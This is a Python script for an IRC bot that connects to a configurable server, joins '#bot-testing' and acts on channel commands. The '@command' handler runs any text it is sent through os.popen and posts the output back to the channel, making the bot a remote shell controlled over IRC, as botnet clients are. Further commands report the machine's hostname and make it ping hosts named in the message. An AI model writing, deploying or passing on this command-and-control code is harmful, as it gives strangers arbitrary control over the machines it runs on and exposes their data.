#!/usr/bin/python3
import platform    # For getting the operating system name
import subprocess  # For executing a shell command
import socket
import os
from time import time,sleep
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
def pong(): # respond to server Pings.
    ircsock.send("PONG :pingisn");

def connect():
    server = "x.x.x.x"; # Enter your Server IP
    channel = "#bot-testing"; # Channel
    botnick = "B0t-Ubuntu"; # Your bots nick
    ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667

    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
    ircsock.sendall((sendstr).encode('utf-8'));

    ircsock.sendall(("NICK "+ botnick +"\r\n").encode('utf-8')) # assign the nick to the bot

    while 1: #this while block is for ping-pong IRC responses (NOT IMPORTANT BUT READ THE IRC STANDARD TO UNDERSTAND THE PORT)
        ircmsg = ircsock.recv(2048).decode("utf-8")
        print (ircmsg);
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
            break;
#    joinchan('#bot-testing')

"""
    ircsock.connect((server, 6667)); # Here we connect to the server using the port 6667
    ircmsg = ircsock.recv(2048).decode("utf-8")
    if ircmsg.find ( 'PING' ) != -1:
        ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
        last_ping = time()

    print (ircmsg);
    sendstr = "USER "+botnick+" "+botnick+" "+botnick+" :Python B0t1.!! Testing Case\r\n";
    ircsock.send(sendstr);

    ircsock.send("NICK "+ botnick +"\r\n") # assign the nick to the bot
    joinchan('#bot-testing')
"""

def joinchan(chan): # join channel(s).
    print("JOINING")
    ircsock.sendall(("JOIN "+chan+"\r\n").encode('utf-8'))
    ircmsg = ""
    while 1:
    #    pong()
        ircmsg = ircsock.recv(2048).decode("utf-8")
        ircmsg = ircmsg.strip("\n\r")
        print(ircmsg)
        if ircmsg.find ( 'PING' ) != -1:
            ircsock.sendall(( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' ).encode('utf-8'))
            last_ping = time()
        if ircmsg.lower().find(":@hi") != -1:
            ircsock.send(("PRIVMSG " + chan +" :Hello!\r\n" ).encode('utf-8'))
        if ircmsg.lower().find(":@command") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@command")+10:len(str(ircmsg))];
            stream = os.popen(cmd)
            output = stream.read()
            ircsock.sendall(("PRIVMSG " + chan + " :"+output+'\r'+'\n').encode('utf-8'));
        if ircmsg.lower().find(":@message") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
        if ircmsg.lower().find(":@ping") != -1:
            cmd = ircmsg.lower()[ircmsg.lower().find(":@ping")+7:len(str(ircmsg))];
            ircsock.sendall(("PRIVMSG " + chan + " :"+cmd+'\r'+'\n').encode('utf-8'))
            callPing(cmd)
        if ircmsg.lower().find(":@name") != -1:
            osVal = getOS("linux")
            osVal = osVal.decode('utf-8')
            ircsock.sendall(("PRIVMSG " + chan + " :"+osVal+'\r'+'\n').encode('utf-8'))
        if ircmsg.lower().find(":@exit") != -1:
            ircsock.shutdown(socket.SHUT_RDWR)

def getOS(os):
    if(os=="linux"):
        command = ['cat','/proc/sys/kernel/hostname']
        return subprocess.check_output(command)
def callPing(host):
    param = '-n' if platform.system().lower()=='windows' else '-c'
    command = ['ping', param, '1', host]
    return subprocess.call(command) == 0

chan = '#bot-testing'

connect()
#sleep(10);
joinchan('#bot-testing')
